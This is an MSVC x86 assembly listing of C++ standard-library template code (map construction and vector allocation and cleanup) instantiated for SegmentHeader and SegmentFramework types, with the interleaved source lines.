??0?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ PROC ; std::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >, COMDAT
; _this$ = ecx

; 107  :     map() : _Mybase(key_compare()) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	56		 push	 esi
  00005	8b f1		 mov	 esi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00007	6a 20		 push	 32			; 00000020H
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\map

; 107  :     map() : _Mybase(key_compare()) {}

  00009	89 75 fc	 mov	 DWORD PTR _this$[ebp], esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  0000c	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
  00012	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  00019	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  0001e	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  00021	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  00023	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  00026	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  00029	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  0002f	89 06		 mov	 DWORD PTR [esi], eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\map

; 107  :     map() : _Mybase(key_compare()) {}

  00031	8b c6		 mov	 eax, esi
  00033	5e		 pop	 esi
  00034	8b e5		 mov	 esp, ebp
  00036	5d		 pop	 ebp
  00037	c3		 ret	 0
??0?$map@PBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@U?$less@PBD@2@V?$allocator@U?$pair@QBDV?$vector@UImportInfo@SegmentHeader@@V?$allocator@UImportInfo@SegmentHeader@@@std@@@std@@@std@@@2@@std@@QAE@XZ ENDP ; std::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >::map<char const *,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> >,std::less<char const *>,std::allocator<std::pair<char const * const,std::vector<SegmentHeader::ImportInfo,std::allocator<SegmentHeader::ImportInfo> > > > >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility
;	COMDAT ??1?$_Tidy_guard@V?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@@std@@QAE@XZ
_TEXT	SEGMENT
??1?$_Tidy_guard@V?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@@std@@QAE@XZ PROC ; std::_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >::~_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >, COMDAT
; _this$ = ecx

; 5692 :     ~_Tidy_guard() {

  00000	56		 push	 esi

; 5693 :         if (_Target) {

  00001	8b 31		 mov	 esi, DWORD PTR [ecx]
  00003	85 f6		 test	 esi, esi
  00005	74 46		 je	 SHORT $LN5@Tidy_guard
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  00007	8b 06		 mov	 eax, DWORD PTR [esi]
  00009	85 c0		 test	 eax, eax
  0000b	74 40		 je	 SHORT $LN5@Tidy_guard

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  0000d	8b 4e 08	 mov	 ecx, DWORD PTR [esi+8]
  00010	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00012	83 e1 f8	 and	 ecx, -8			; fffffff8H

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00015	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  0001b	72 12		 jb	 SHORT $LN21@Tidy_guard

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0001d	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  00020	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00023	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00025	83 c0 fc	 add	 eax, -4			; fffffffcH
  00028	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  0002b	77 22		 ja	 SHORT $LN18@Tidy_guard

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0002d	8b c2		 mov	 eax, edx
$LN21@Tidy_guard:

; 195  :     ::operator delete(_Ptr, _Bytes);

  0002f	51		 push	 ecx
  00030	50		 push	 eax
  00031	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  00036	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  0003c	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  0003f	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0

; 1699 :             _Myend   = pointer();

  00046	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
$LN5@Tidy_guard:
  0004d	5e		 pop	 esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xutility

; 5696 :     }

  0004e	c3		 ret	 0
$LN18@Tidy_guard:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0004f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN26@Tidy_guard:
  00055	cc		 int	 3
??1?$_Tidy_guard@V?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@@std@@QAE@XZ ENDP ; std::_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >::~_Tidy_guard<std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> > >
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ?end@?$initializer_list@PBD@std@@QBEPBQBDXZ
_TEXT	SEGMENT
?end@?$initializer_list@PBD@std@@QBEPBQBDXZ PROC	; std::initializer_list<char const *>::end, COMDAT
; _this$ = ecx

; 43   :         return _Last;

  00000	8b 41 04	 mov	 eax, DWORD PTR [ecx+4]

; 44   :     }

  00003	c3		 ret	 0
?end@?$initializer_list@PBD@std@@QBEPBQBDXZ ENDP	; std::initializer_list<char const *>::end
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ?begin@?$initializer_list@PBD@std@@QBEPBQBDXZ
_TEXT	SEGMENT
?begin@?$initializer_list@PBD@std@@QBEPBQBDXZ PROC	; std::initializer_list<char const *>::begin, COMDAT
; _this$ = ecx

; 39   :         return _First;

  00000	8b 01		 mov	 eax, DWORD PTR [ecx]

; 40   :     }

  00002	c3		 ret	 0
?begin@?$initializer_list@PBD@std@@QBEPBQBDXZ ENDP	; std::initializer_list<char const *>::begin
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ?end@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ
_TEXT	SEGMENT
?end@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ PROC ; std::initializer_list<SegmentFramework::RelocatedNetVar>::end, COMDAT
; _this$ = ecx

; 43   :         return _Last;

  00000	8b 41 04	 mov	 eax, DWORD PTR [ecx+4]

; 44   :     }

  00003	c3		 ret	 0
?end@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ ENDP ; std::initializer_list<SegmentFramework::RelocatedNetVar>::end
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\initializer_list
;	COMDAT ?begin@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ
_TEXT	SEGMENT
?begin@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ PROC ; std::initializer_list<SegmentFramework::RelocatedNetVar>::begin, COMDAT
; _this$ = ecx

; 39   :         return _First;

  00000	8b 01		 mov	 eax, DWORD PTR [ecx]

; 40   :     }

  00002	c3		 ret	 0
?begin@?$initializer_list@URelocatedNetVar@SegmentFramework@@@std@@QBEPBURelocatedNetVar@SegmentFramework@@XZ ENDP ; std::initializer_list<SegmentFramework::RelocatedNetVar>::begin
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@ABEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ
_TEXT	SEGMENT
?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@ABEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal, COMDAT
; _this$ = ecx

; 1736 :         return _Mypair._Get_first();

  00000	8b c1		 mov	 eax, ecx

; 1737 :     }

  00002	c3		 ret	 0
?_Getal@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@ABEABV?$allocator@URelocatedNetVar@SegmentFramework@@@2@XZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Tidy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXXZ
_TEXT	SEGMENT
?_Tidy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXXZ PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Tidy, COMDAT
; _this$ = ecx

; 1685 :     void _Tidy() noexcept { // free all storage

  00000	56		 push	 esi
  00001	8b f1		 mov	 esi, ecx

; 1686 :         auto& _My_data    = _Mypair._Myval2;
; 1687 :         pointer& _Myfirst = _My_data._Myfirst;
; 1688 :         pointer& _Mylast  = _My_data._Mylast;
; 1689 :         pointer& _Myend   = _My_data._Myend;
; 1690 : 
; 1691 :         _My_data._Orphan_all();
; 1692 : 
; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  00003	8b 06		 mov	 eax, DWORD PTR [esi]
  00005	85 c0		 test	 eax, eax
  00007	74 40		 je	 SHORT $LN2@Tidy

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  00009	8b 4e 08	 mov	 ecx, DWORD PTR [esi+8]
  0000c	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0000e	83 e1 f8	 and	 ecx, -8			; fffffff8H

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00011	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  00017	72 12		 jb	 SHORT $LN18@Tidy

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00019	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  0001c	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0001f	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00021	83 c0 fc	 add	 eax, -4			; fffffffcH
  00024	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  00027	77 22		 ja	 SHORT $LN15@Tidy

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00029	8b c2		 mov	 eax, edx
$LN18@Tidy:

; 195  :     ::operator delete(_Ptr, _Bytes);

  0002b	51		 push	 ecx
  0002c	50		 push	 eax
  0002d	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  00032	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  00038	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  0003b	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0

; 1699 :             _Myend   = pointer();

  00042	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
$LN2@Tidy:

; 1701 :     }

  00049	5e		 pop	 esi
  0004a	c3		 ret	 0
$LN15@Tidy:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0004b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN22@Tidy:
  00051	cc		 int	 3
?_Tidy@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXXZ ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
;	COMDAT ?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z
_TEXT	SEGMENT
__Newcapacity$ = 8					; size = 4
?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z PROC ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw, COMDAT
; _this$ = ecx

; 1632 :     void _Buy_raw(const size_type _Newcapacity) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	56		 push	 esi
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 34   :             if (_Count > _Max_possible) {

  00004	8b 75 08	 mov	 esi, DWORD PTR __Newcapacity$[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1632 :     void _Buy_raw(const size_type _Newcapacity) {

  00007	57		 push	 edi
  00008	8b f9		 mov	 edi, ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 34   :             if (_Count > _Max_possible) {

  0000a	81 fe ff ff ff
	1f		 cmp	 esi, 536870911		; 1fffffffH
  00010	77 6f		 ja	 SHORT $LN30@Buy_raw

; 35   :                 _Throw_bad_array_new_length(); // multiply overflow
; 36   :             }
; 37   :         }
; 38   : 
; 39   :     return _Count * _Ty_size;

  00012	c1 e6 03	 shl	 esi, 3

; 174  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00015	81 fe 00 10 00
	00		 cmp	 esi, 4096		; 00001000H
  0001b	72 35		 jb	 SHORT $LN10@Buy_raw

; 89   :     const size_t _Block_size = _Non_user_size + _Bytes;

  0001d	8d 46 23	 lea	 eax, DWORD PTR [esi+35]

; 90   :     if (_Block_size <= _Bytes) {

  00020	3b c6		 cmp	 eax, esi
  00022	76 5d		 jbe	 SHORT $LN30@Buy_raw

; 51   :         return ::operator new(_Bytes);

  00024	50		 push	 eax
  00025	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new

; 94   :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));

  0002a	8b c8		 mov	 ecx, eax

; 51   :         return ::operator new(_Bytes);

  0002c	83 c4 04	 add	 esp, 4

; 95   :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0002f	85 c9		 test	 ecx, ecx
  00031	74 19		 je	 SHORT $LN19@Buy_raw

; 96   :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

  00033	8d 41 23	 lea	 eax, DWORD PTR [ecx+35]
  00036	83 e0 e0	 and	 eax, -32		; ffffffe0H

; 97   :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

  00039	89 48 fc	 mov	 DWORD PTR [eax-4], ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1643 :         _Myfirst           = _Newvec;

  0003c	89 07		 mov	 DWORD PTR [edi], eax

; 1644 :         _Mylast            = _Newvec;

  0003e	89 47 04	 mov	 DWORD PTR [edi+4], eax

; 1645 :         _Myend             = _Newvec + _Newcapacity;

  00041	03 c6		 add	 eax, esi
  00043	89 47 08	 mov	 DWORD PTR [edi+8], eax
  00046	5f		 pop	 edi
  00047	5e		 pop	 esi

; 1646 :     }

  00048	5d		 pop	 ebp
  00049	c2 04 00	 ret	 4
$LN19@Buy_raw:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 95   :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

  0004c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN10@Buy_raw:

; 179  :     if (_Bytes != 0) {

  00052	85 f6		 test	 esi, esi
  00054	74 19		 je	 SHORT $LN11@Buy_raw

; 51   :         return ::operator new(_Bytes);

  00056	56		 push	 esi
  00057	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1643 :         _Myfirst           = _Newvec;

  0005c	89 07		 mov	 DWORD PTR [edi], eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0005e	83 c4 04	 add	 esp, 4
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1644 :         _Mylast            = _Newvec;

  00061	89 47 04	 mov	 DWORD PTR [edi+4], eax

; 1645 :         _Myend             = _Newvec + _Newcapacity;

  00064	03 c6		 add	 eax, esi
  00066	89 47 08	 mov	 DWORD PTR [edi+8], eax
  00069	5f		 pop	 edi
  0006a	5e		 pop	 esi

; 1646 :     }

  0006b	5d		 pop	 ebp
  0006c	c2 04 00	 ret	 4
$LN11@Buy_raw:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 183  :     return nullptr;

  0006f	33 c0		 xor	 eax, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1643 :         _Myfirst           = _Newvec;

  00071	89 07		 mov	 DWORD PTR [edi], eax

; 1644 :         _Mylast            = _Newvec;

  00073	89 47 04	 mov	 DWORD PTR [edi+4], eax

; 1645 :         _Myend             = _Newvec + _Newcapacity;

  00076	8b c6		 mov	 eax, esi
  00078	89 47 08	 mov	 DWORD PTR [edi+8], eax
  0007b	5f		 pop	 edi
  0007c	5e		 pop	 esi

; 1646 :     }

  0007d	5d		 pop	 ebp
  0007e	c2 04 00	 ret	 4
$LN30@Buy_raw:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 91   :         _Throw_bad_array_new_length(); // add overflow

  00081	e8 00 00 00 00	 call	 ?_Throw_bad_array_new_length@std@@YAXXZ ; std::_Throw_bad_array_new_length
$LN31@Buy_raw:
  00086	cc		 int	 3
?_Buy_raw@?$vector@URelocatedNetVar@SegmentFramework@@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@AAEXI@Z ENDP ; std::vector<SegmentFramework::RelocatedNetVar,std::allocator<SegmentFramework::RelocatedNetVar> >::_Buy_raw
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SA?AV?$allocator@URelocatedNetVar@SegmentFramework@@@2@ABV32@@Z
_TEXT	SEGMENT
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SA?AV?$allocator@URelocatedNetVar@SegmentFramework@@@2@ABV32@@Z PROC ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::select_on_container_copy_construction, COMDAT
; ___$ReturnUdt$ = ecx
; __Al$dead$ = edx

; 684  :         return _Al;

  00000	8b c1		 mov	 eax, ecx

; 685  :     }

  00002	c3		 ret	 0
?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@URelocatedNetVar@SegmentFramework@@@std@@@std@@SA?AV?$allocator@URelocatedNetVar@SegmentFramework@@@2@ABV32@@Z ENDP ; std::_Default_allocator_traits<std::allocator<SegmentFramework::RelocatedNetVar> >::select_on_container_copy_construction
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
